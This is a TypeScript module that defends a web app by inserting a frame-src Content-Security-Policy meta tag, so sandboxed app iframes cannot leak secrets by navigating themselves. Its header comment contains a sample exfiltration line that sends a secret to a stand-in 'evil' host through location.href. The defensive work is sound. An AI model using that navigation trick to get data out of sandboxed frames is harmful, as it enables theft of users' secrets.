/**
 * The page's own `frame-src`, put in place when the first app frame mounts.
 *
 * WHY. An app runs in `<iframe sandbox="allow-scripts">` under a CSP that
 * forbids every request. One thing CSP inside the frame cannot forbid is the
 * frame navigating ITSELF (`location.href = "https://evil/?" + secret`,
 * `<meta http-equiv=refresh>`): the request is a navigation, and there is no
 * `navigate-to`. The only control is the EMBEDDING page's `frame-src`, which
 * decides what a child frame may load, itself included. The S0 spike
 * (`spike-sandbox.md`) measured the hole: a canary server received the secret.
 *
 * WHY A META AND NOT A HEADER. pqp.gg has no CSP today and a site-wide header
 * is a decision for the whole app (Clerk, Faro, Umami, LiveKit, every embed),
 * which this change does not make. A `<meta http-equiv="Content-Security-Policy">`
 * carrying ONLY `frame-src` is a narrow policy that constrains nothing else
 * (no `default-src`, no `script-src`), is honoured for `frame-src` by every
 * engine (`client/e2e/app-frame/`), and exists only on pages that mount an app.
 * It cannot be removed again once inserted (an inserted policy sticks to the
 * document), which is the point.
 *
 * WHAT IT LISTS: every origin the client legitimately frames today. A missing
 * origin here breaks that embed on a page that has also shown an app, so the
 * list is pinned by `frame-policy.test.ts` against the embed URL builders the
 * client really uses. Never a wildcard on a multi-tenant domain
 * (`*.clerk.accounts.dev` is a name anybody can register): an allowed origin is
 * also a place a hostile frame may send a query string to.
 *
 * Dependency free on purpose: the e2e suite bundles this very file.
 */

/** Embeds the client renders (community home, the featured media, the music player) and the sign-in widgets. */
export const FRAME_SRC_ORIGINS = [
  // YouTube: the community home embed (nocookie) and the IFrame API player (music queue)
  "https://www.youtube.com",
  "https://www.youtube-nocookie.com",
  // Twitch player and clips
  "https://player.twitch.tv",
  "https://clips.twitch.tv",
  // community home media
  "https://www.tiktok.com",
  "https://www.instagram.com",
  // Clerk's bot protection (Cloudflare Turnstile) and Google sign-in
  "https://challenges.cloudflare.com",
  "https://accounts.google.com",
] as const;

export const FRAME_POLICY_ATTRIBUTE = "data-pqp-app-frame-policy";

export interface FramePolicyOptions {
  /** The apps origin from `GET /api/apps/config`. */
  appsOrigin: string;
  /** More origins this deployment frames: Clerk's frontend host, a self-host's embeds. */
  extraOrigins?: readonly string[];
}

/** `https://clerk.example.com` from a Clerk publishable key (`pk_live_<base64 of "clerk.example.com$">`). */
export function clerkFrontendOrigin(publishableKey: string | undefined): string | null {
  if (!publishableKey) return null;
  const encoded = publishableKey.split("_").slice(2).join("_");
  if (encoded === "") return null;
  try {
    const host = atob(encoded.replace(/-/g, "+").replace(/_/g, "/")).replace(/\$$/, "");
    return /^[a-z0-9.-]+\.[a-z]{2,}$/i.test(host) ? `https://${host}` : null;
  } catch {
    return null;
  }
}

/** A source expression is an origin or a keyword; anything that could widen the policy is refused. */
function cleanOrigin(value: string): string | null {
  try {
    const url = new URL(value);
    if (url.protocol !== "https:" && url.protocol !== "http:") return null;
    if (url.hostname.includes("*")) return null;
    return url.origin;
  } catch {
    return null;
  }
}

/** The policy text: `frame-src 'self' blob: <origins>`, de-duplicated and in a stable order. */
export function buildFramePolicy(options: FramePolicyOptions): string {
  const sources = new Set<string>(["'self'", "blob:"]);
  for (const origin of [options.appsOrigin, ...FRAME_SRC_ORIGINS, ...(options.extraOrigins ?? [])]) {
    const clean = cleanOrigin(origin);
    if (clean) sources.add(clean);
  }
  return `frame-src ${[...sources].join(" ")}`;
}

/**
 * Inserts the policy once per document. Returns whether this call inserted it.
 * Call it BEFORE the first app frame starts loading: a policy applies to
 * navigations that start after it is in the `<head>`.
 */
export function ensureAppFramePolicy(
  options: FramePolicyOptions,
  doc: Document = document,
): boolean {
  if (doc.head.querySelector(`meta[${FRAME_POLICY_ATTRIBUTE}]`)) return false;
  const meta = doc.createElement("meta");
  meta.setAttribute("http-equiv", "Content-Security-Policy");
  meta.setAttribute("content", buildFramePolicy(options));
  meta.setAttribute(FRAME_POLICY_ATTRIBUTE, "");
  doc.head.append(meta);
  return true;
}
